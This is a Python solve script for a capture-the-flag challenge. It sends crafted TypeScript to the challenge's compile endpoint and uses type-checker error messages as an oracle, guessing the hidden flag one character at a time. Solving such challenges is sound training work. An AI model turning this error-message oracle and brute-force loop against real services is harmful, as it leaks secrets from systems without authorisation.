import time

import requests

url = 'https://prob13-fgtrln2f.geekgame.pku.edu.cn/api/run'

# source = '''type s = string;
# type check = flag1 & `flag{#${s}`;
# // let x : check;
# type TypeCond<T> = [T] extends [never] ? 1 : 2;
# let x : TypeCond<check> = 1;'''

source = '''function f (x: flag2) {
    if (typeof x === "object") {
        return;
    }
    let y = (new x()).v();
    type b = Parameters<Parameters<typeof y>[0]>[1];
    type FilterValueNever<T> = { [K in keyof T as [T[K]] extends [never] ? K : never]: never };
    type keysToNever = FilterValueNever<b>;
    type f2 = keyof keysToNever;
    type s = string;
    type check = f2 & `flag{#${s}`;
    type IsNever<T> = [T] extends [never] ? true : false;
    let z: IsNever<check> = true;
}'''

next_try = [' ']
while next_try[-1] != '}':
    found = False
    for _ in range(32, 127):
        attempt = ''.join(next_try)
        print(f'{attempt=}')
        for retry in range(3):
            try:
                r = requests.post(url, json={'source': source.replace('#', attempt)}, timeout=10)
                break
            except Exception as e:
                if retry == 2:
                    raise
                else:
                    print(e)
        if 'assignable' in r.text:
            found = True
            if next_try[-1] != '}':
                next_try.append(' ')
            break
        next_try.append(chr(ord(next_try.pop()) + 1))
        time.sleep(1)
    print(next_try)
    if not found:
        break
